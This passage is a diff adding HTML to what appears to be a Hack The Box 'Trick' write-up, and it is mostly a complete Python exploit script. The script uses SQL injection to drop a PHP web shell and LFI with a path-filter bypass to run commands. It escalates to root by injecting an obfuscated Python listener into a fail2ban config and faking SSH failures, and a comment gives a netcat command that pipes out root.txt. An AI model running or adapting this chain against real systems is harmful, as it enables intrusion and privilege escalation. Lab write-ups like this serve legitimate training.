@@ -815,6 +815,273 @@ marketing               <span class="o">[</span>Status: <span class="m">200</spa
 payroll                 <span class="o">[</span>Status: <span class="m">302</span>, Size: <span class="m">9546</span>, Words: <span class="m">1453</span>, Lines: <span class="m">267</span>, Duration: 38ms<span class="o">]</span>
 :: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
 </code></pre></div>
+
+<p>Here is the all in one PoC to pwn the machine.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">fcntl</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">ch</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">StreamHandler</span><span class="p">()</span>
+<span class="n">ch</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">CustomFormatter</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Formatter class to generate colourful log message&quot;&quot;&quot;</span>
+    <span class="n">grey</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[38;20m&quot;</span>
+    <span class="n">blue</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x1b</span><span class="s1">[38;5;39m&#39;</span>
+    <span class="n">yellow</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[33;20m&quot;</span>
+    <span class="n">red</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[31;20m&quot;</span>
+    <span class="n">bold_red</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[31;1m&quot;</span>
+    <span class="n">reset</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[0m&quot;</span>
+    <span class="n">FORMAT</span> <span class="o">=</span> <span class="s2">&quot;[</span><span class="si">%(filename)s</span><span class="s2">:</span><span class="si">%(lineno)s</span><span class="s2"> - </span><span class="si">%(funcName)20s</span><span class="s2">() ] </span><span class="si">%(message)s</span><span class="s2">&quot;</span>
+    <span class="c1"># FORMAT = &quot;%(asctime)s - %(name)s - %(levelname)s - %(message)s (%(filename)s:%(lineno)d)&quot;</span>
+
+    <span class="n">FORMATS</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">:</span> <span class="n">blue</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">:</span> <span class="n">grey</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">:</span> <span class="n">yellow</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">:</span> <span class="n">red</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">CRITICAL</span><span class="p">:</span> <span class="n">bold_red</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">format</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">record</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot;</span>
+
+<span class="sd">        Args:</span>
+<span class="sd">          record (dict): attribute dictionary for string formatting operation</span>
+
+<span class="sd">        Returns:</span>
+<span class="sd">            str: The formatted string</span>
+
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">log_fmt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">FORMATS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">record</span><span class="o">.</span><span class="n">levelno</span><span class="p">)</span>
+        <span class="n">formatter</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span><span class="n">log_fmt</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">formatter</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">record</span><span class="p">)</span>
+
+
+<span class="n">ch</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">CustomFormatter</span><span class="p">())</span>
+<span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">sql_injection_str2file</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Using the SQL injection in the manage_employeed.php endpoint to write a simple PHP shell to `/tmp/phpcmd.php`.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      test:  (Default value = False) wether to test the injection only</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        None</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Starting SQL injection&quot;</span><span class="p">)</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/manage_employee.php?id=-1&quot;</span>
+    <span class="n">injectionstr</span> <span class="o">=</span> <span class="s2">&quot;UNION ALL SELECT NULL,NULL,NULL,NULL,</span><span class="si">{}</span><span class="s2">,NULL,NULL,NULL&quot;</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">test</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Testing SQL injection&quot;</span><span class="p">)</span>
+            <span class="n">injection</span> <span class="o">=</span> <span class="n">injectionstr</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;0x3a3a666f6f6261723a3a&#39;</span><span class="p">)</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">injection</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="p">((</span><span class="n">content</span> <span class="o">:=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;::foobar::&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;SQL injection failed&quot;</span><span class="p">)</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+                <span class="k">if</span> <span class="s2">&quot;502 Bad Gateway&quot;</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+                    <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;You should reset the machine, maybe the PHP process isn&#39;t working anymore&quot;</span><span class="p">)</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;SQL injection success&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">None</span>
+        <span class="n">injection</span> <span class="o">=</span> <span class="n">injectionstr</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&quot;CONCAT(0x3a5e5e3a,LOAD_FILE(&#39;/tmp/phpcmd.php&#39;),0x3a5e5e3a)&quot;</span><span class="p">)</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">injection</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">filecontent</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span>
+                <span class="sa">r</span><span class="sd">&quot;&quot;&quot;&lt;input type=&quot;text&quot; name=&quot;lastname&quot; required=&quot;required&quot; class=&quot;form-control&quot; value=&quot;:\^\^:(.*?):\^\^:&quot; /&gt;&quot;&quot;&quot;</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span>
+        <span class="p">)</span>
+        <span class="c1"># Inject only if the PHP shell isn&#39;t already present</span>
+        <span class="k">if</span> <span class="s2">&quot;&quot;&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;&quot;&quot;</span> <span class="ow">in</span> <span class="n">filecontent</span><span class="p">[:</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;PHP Shell already present&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">injection</span> <span class="o">=</span> <span class="s2">&quot;UNION ALL SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a &quot;</span> \
+                <span class="s2">&quot;INTO DUMPFILE &#39;/tmp/phpcmd.php&#39;-- -&quot;</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">injection</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">lfi_rce_payroll</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;Using the injected and written PHP shell `tmp/phpcmd.php` to execute commands, extracting the output from the web page.</span>
+<span class="sd">    The used endpoint belongs to `preprod-payroll.trick.htb/index.php?page=`.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># The vulnerable PHP code below</span>
+    <span class="c1"># &lt;?php $page = isset($_GET[&#39;page&#39;]) ? $_GET[&#39;page&#39;] :&#39;home&#39;; ?&gt;</span>
+    <span class="c1"># &lt;?php include $page.&#39;.php&#39; ?&gt;</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Starting Payroll LFI/RCE&quot;</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;cat /var/www/market/index.php&quot;</span>
+    <span class="n">TESTCMD</span> <span class="o">=</span> <span class="s2">&quot;echo ]foobar[&quot;</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&amp;cmd=</span><span class="si">{}</span><span class="s2">&quot;</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">TESTCMD</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">cmdout</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;main id=&quot;view-panel&quot; &gt;(.*)&lt;/main&gt;&#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s2">&quot;]foobar[&quot;</span> <span class="ow">in</span> <span class="n">cmdout</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;PHP Shell working, we have RCE&quot;</span><span class="p">)</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+            <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+            <span class="n">cmdout</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;main id=&quot;view-panel&quot; &gt;(.*)&lt;/main&gt;&#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">cmdout</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;Payroll RCE failed&quot;</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">lfi_rce_marketing</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">test</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Using the injected and written PHP shell `/tmp/phpcmd.php` in the `marketing` vhost to execute commands and extract the</span>
+<span class="sd">    output from the web page.</span>
+<span class="sd">    The commands are executed as local user `michael`</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      cmd (str):  (Default value = &quot;&quot;) The cmd to execute</span>
+<span class="sd">      test (bool):  (Default value = False) If true, validate if RCE works</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: the output of the executed cmd</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># The vulnerable PHP code below</span>
+    <span class="c1"># $file = $_GET[&#39;page&#39;];</span>
+    <span class="c1"># include(&quot;/var/www/market/&quot;.str_replace(&quot;../&quot;,&quot;&quot;,$file));</span>
+    <span class="k">if</span> <span class="n">test</span><span class="p">:</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Testing Marketing LFI/RCE&quot;</span><span class="p">)</span>
+    <span class="n">TESTCMD</span> <span class="o">=</span> <span class="s2">&quot;echo ]foobar[&quot;</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&amp;cmd=</span><span class="si">{}</span><span class="s2">&quot;</span>
+    <span class="c1"># Setting the Host header to reach the `marketing` vhost</span>
+    <span class="c1"># We could also set the DNS record of `preprod-marketing.trick.htb` to the targets IP</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;preprod-marketing.trick.htb&quot;</span>
+    <span class="p">}</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">test</span><span class="p">:</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">TESTCMD</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+            <span class="c1"># logger.debug(content)</span>
+            <span class="n">cmdout</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="k">if</span> <span class="s2">&quot;]foobar[&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cmdout</span><span class="p">:</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Marketing RCE failed, cmd was: </span><span class="si">{</span><span class="n">TESTCMD</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Marketing LFI/RCE success&quot;</span><span class="p">)</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">cmdout</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">cmdout</span>
+
+
+<span class="k">def</span> <span class="nf">user_flag</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;Extract the user flag using various exploitation techniques.</span>
+<span class="sd">    The LFI in the marketing endpoint is executed as user michael, allowing us to read the `user.txt` file in the home directory.</span>
+<span class="sd">    Returns:</span>
+<span class="sd">        str: the user flag</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">sql_injection_str2file</span><span class="p">()</span>
+    <span class="n">user_flag</span> <span class="o">=</span> <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;cat /home/michael/user.txt&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">user_flag</span>
+
+
+<span class="k">def</span> <span class="nf">root_flag</span><span class="p">(</span><span class="n">lip</span><span class="p">,</span> <span class="n">tip</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Extract the users flag using various exploitation techniques.</span>
+<span class="sd">    User michael is abel to use sudo to restart fail2ban, shown by `sudo -l`. The user is part of the security group that can create and delete</span>
+<span class="sd">    files in `/etc/fail2ban/action.d/`, but don&#39;t change.</span>
+<span class="sd">    By copying and altering the ban command in `iptables-multiport.conf`, a python script is executed that reads the root flag and outputs the</span>
+<span class="sd">    content to the first client connecting on port 35345. After changing the ban command the file is force copied to the original location and</span>
+<span class="sd">    fail2ban restarted using the sudo command.</span>
+<span class="sd">    To trigger the ban command, we could connect and falsely authenticate to the SSH daemon multiple times. Instead we inject simulated failed login</span>
+<span class="sd">    attempts in the `/var/log/auth.log` leveraging the `logger` linux command.</span>
+<span class="sd">    After a short wait time the script connects to the hopefully running python socket and receives the root flag.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      lip (str): The local IP (attacker machine)</span>
+<span class="sd">      tip (str): The target IP</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: the user flag</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">sql_injection_str2file</span><span class="p">()</span>
+    <span class="n">sudo_check</span> <span class="o">=</span> <span class="s2">&quot;(root) NOPASSWD: /etc/init.d/fail2ban restart&quot;</span>
+    <span class="k">if</span> <span class="n">sudo_check</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;sudo -l&quot;</span><span class="p">):</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;fail2ban restart not executable with sudo&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;which python3&quot;</span><span class="p">):</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;python3 not available&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/im.conf.tmp&quot;</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;sed -i &quot;s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;python3 \-c &#39;exec\(\&quot;\\\nimport socket\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;d\=lambda istr\: bytes\.fromhex\(hex\(istr\)\[2\:\]\)\.decode\(\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;s\=socket\.socket\(socket\.AF_INET,socket\.SOCK_STREAM\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;s\.setsockopt\(socket\.SOL_SOCKET, socket\.SO_REUSEADDR, 1\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;s\.bind\(\(d\(13561583350328880\),35345\)\)\\\ns\.listen\(5\)\\\nc,a\=s\.accept\(\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;c\.sendall\(open\(d\(962339749473780545853982382520436\), d\(29282\)\)\.read\(\)\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;\&quot;\)&#39;/g&quot; /tmp/im.conf.tmp&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="p">])</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;cp -f /tmp/im.conf.tmp /etc/fail2ban/action.d/iptables-multiport.conf&quot;&quot;&quot;</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;sudo /etc/init.d/fail2ban restart&quot;&quot;&quot;</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+    <span class="c1"># ALTERNATIV: cat /root/root.txt | nc -Nlvp 4444</span>
+    <span class="c1"># client: nc -d 127.0.0.1 4444</span>
+    <span class="n">logger_chain</span> <span class="o">=</span> <span class="s1">&#39;logger --tag sshd --id=1337 -p auth.info &quot;Failed password for invalid user root from 192.192.192.192 port 31337 ssh2&quot;;sleep 2;&#39;</span> <span class="o">*</span> <span class="mi">12</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="n">logger_chain</span><span class="p">)</span>
+    <span class="c1"># for i in range(15):</span>
+    <span class="c1">#     lfi_rce_marketing(f&quot;&quot;&quot;logger --tag sshd --id={1337+i} -p auth.info &#39;Failed password for invalid user root from 192.192.192.192 port {31337+i} ssh2&#39;&quot;&quot;&quot;)</span>
+    <span class="c1">#     time.sleep(1)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">tip</span><span class="p">,</span> <span class="mi">35345</span><span class="p">))</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">root_flag</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">root_flag</span>
+
+
+<span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      ifname (str): Name of the network interface</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: The IP of the given network interface</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
+        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
+        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">],</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;The main function to start the PoC&quot;&quot;&quot;</span>
+    <span class="c1"># Enable DEBUG logging if you want see the executed steps</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
+    <span class="c1"># logger.setLevel(logging.INFO)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Initializing PoC&quot;</span><span class="p">)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Getting the root flag takes around 30 seconds, be patient&quot;</span><span class="p">)</span>
